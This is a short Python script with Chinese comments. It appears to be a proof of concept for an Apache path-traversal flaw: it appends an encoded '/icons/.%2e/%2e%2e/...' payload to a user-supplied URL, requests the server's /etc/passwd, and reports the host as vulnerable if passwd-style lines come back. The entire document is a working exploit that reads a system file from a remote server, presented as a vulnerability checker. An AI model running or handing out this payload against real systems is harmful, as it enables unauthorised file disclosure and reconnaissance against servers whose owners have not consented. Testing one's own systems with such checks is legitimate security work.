import urllib3  # 请求模块和requests一样，以前用的
import re  # 正则表达式模块
import sys

url = input("请输入url：")
payload = "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
url = url + payload  # 将获取的uel和payload拼接

try:  # 抛出异常，出现异常就交给下面的except：处理，这里主要处理请求超时
    http = urllib3.PoolManager()   # 创建一个连接池的实例
    r = http.request(
        "GET", url, timeout=2)  # 发起一个get请求

except:
    # 请求超时，打印信息
    print("[-] 请求超时或url无效")
    sys.exit()  # 请求都超时了，后面就没必要执行了，结束程序

flag = re.findall('\w{1,9}:\w{1,2}:\w{1,7}:\w{1,7}:\w{1,9}:/',
                  str(r.data))  # 正则匹配，匹配返回信息里面有没有用户信息，返回个列表

if (r.status) == 200 and flag:  # 状态码为200，且正则匹配有东西，那么说明漏洞存在
    print("[+] 存在漏洞")
else:  # 否则漏洞不存在
    print("[-] 该漏洞不存在")
